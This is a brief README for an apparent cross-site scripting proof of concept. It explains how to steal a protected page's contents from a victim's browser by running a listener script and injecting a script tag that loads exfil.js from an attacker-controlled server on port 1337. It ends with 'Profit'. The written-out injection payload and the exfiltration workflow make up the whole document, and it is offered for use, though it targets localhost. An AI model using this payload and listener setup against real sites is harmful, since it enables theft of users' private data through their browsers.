# xss-exfil POC
Exfiltrate sensitive data from victim via XSS. It will steal contents of http://127.0.0.1:9999/sensitive.html which is otherwise not accessible by the attacker.

# Steps
1. Start your server. It will listen for incoming requests on port 1337 and print contents of the sensitive data.
   ```bash
   ./xss-exfil.py
   ```
2. Load the `exfil.js` script on victim's browser via XSS
   ```html
   <script type="text/javascript" src="http://127.0.0.1:1337/exfil.js"></script>
   ```
3. Profit

## Note:
1. Server at port 9999 => Server vulnerable to XSS
2. Server at port 1337 => Attacker controlled listener
3. This is just a proof of concept and may throw exceptions in some cases.

If you have any ideas, let me know :)